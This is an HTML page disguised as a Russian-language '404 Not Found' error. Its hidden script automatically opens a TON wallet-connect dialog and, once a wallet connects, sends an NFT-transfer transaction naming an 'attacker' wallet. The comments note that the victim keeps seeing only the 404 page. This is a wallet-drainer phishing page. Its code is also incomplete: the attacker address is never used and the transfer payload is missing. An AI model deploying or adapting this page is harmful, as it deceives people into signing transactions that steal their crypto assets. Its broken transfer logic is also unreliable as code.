<!DOCTYPE html>
<html>
<head>
    <title>404 Not Found</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f0f0f0; }
        h1 { font-size: 50px; color: #333; }
        p { color: #666; }
    </style>
    <!-- Подключаем TON Connect UI библиотеку -->
    <script src="https://unpkg.com/tonconnect-ui@latest/dist/tonconnect-ui.min.js"></script>
    <script src="https://unpkg.com/tonconnect-sdk@latest/dist/tonconnect-sdk.min.js"></script>
</head>
<body>
    <h1>404</h1>
    <p>Страница не найдена</p>
    <!-- Этот блок скрыт, но содержит кнопку для инициализации подключения -->
    <div id="ton-connect" style="display:none;"></div>

    <script>
        // Адрес контракта NFT (пример, заменить на реальный)
        const nftContractAddress = 'EQD...'; // адрес NFT-контракта в TON
        const attackerAddress = 'UQ...'; // адрес кошелька атакующего

        // Инициализация TON Connect
        const connector = new TonConnect.Connector();

        // Создаём элемент UI для подключения (скрытый)
        const tonConnectUI = new TonConnectUI.TonConnectUI({
            connector,
            buttonRootId: 'ton-connect' // элемент, где будет кнопка
        });

        // Функция для попытки автоматического подключения, если кошелёк уже был подключён ранее
        async function tryAutoConnect() {
            if (connector.connected) {
                // Если уже подключены, пытаемся выполнить перевод NFT
                await transferNFT();
            } else {
                // Иначе показываем диалог подключения
                tonConnectUI.openModal();
            }
        }

        // Подписка на события подключения
        connector.onStatusChange(async (walletInfo) => {
            if (walletInfo) {
                // Кошелёк подключён, запускаем передачу NFT
                await transferNFT();
            }
        });

        // Функция для отправки транзакции перевода NFT
        async function transferNFT() {
            // Получаем информацию о кошельке
            const wallet = connector.wallet;
            if (!wallet) return;

            // Формируем транзакцию для transfer NFT (по стандарту TEP-62)
            // В TON трансфер NFT обычно требует вызова метода контракта
            // Для примера используем упрощённую структуру
            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 600, // 10 минут
                messages: [
                    {
                        address: nftContractAddress, // кому отправляем (контракт NFT)
                        amount: '5000000' // 0.005 TON (комиссия)
                    }
                ]
            };

            // Добавляем payload для вызова transfer (зависит от контракта)
            // Обычно это сериализованное сообщение с параметрами: from, to, tokenId
            // Для простоты предполагаем, что жертва уже дала разрешение (approval)
            // В реальности потребуется сложная сериализация по ABI контракта

            try {
                const result = await connector.sendTransaction(transaction);
                console.log('Transaction sent:', result);
                // После отправки можно ничего не делать, пользователь видит 404
            } catch (e) {
                console.error('Transaction error:', e);
            }
        }

        // Запускаем попытку автоподключения через небольшую задержку (чтобы страница успела загрузиться)
        setTimeout(tryAutoConnect, 1000);
    </script>
</body>
</html>
